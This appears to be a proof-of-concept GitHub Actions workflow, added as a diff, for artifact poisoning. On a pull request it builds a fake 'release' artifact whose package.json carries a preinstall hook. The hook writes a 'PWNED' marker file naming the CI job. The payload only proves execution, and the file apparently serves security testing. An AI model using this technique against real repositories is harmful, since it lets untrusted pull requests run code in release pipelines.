@@ -1,0 +1,29 @@
+name: CD POC-ART
+
+on: pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft release artifact
+        run: |
+          mkdir -p staging
+          cat > staging/package.json <<'JSON'
+          {
+            "name": "attacker-release",
+            "version": "1.0.0",
+            "scripts": {
+              "preinstall": "node -e \"require('fs').writeFileSync('npm-proof.txt','PWNED_NPM_PREINSTALL job='+process.env.GITHUB_JOB)\""
+            }
+          }
+          JSON
+          echo '[]' > staging/versions.json
+          printf '' > staging/series.txt
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: release
+          path: staging
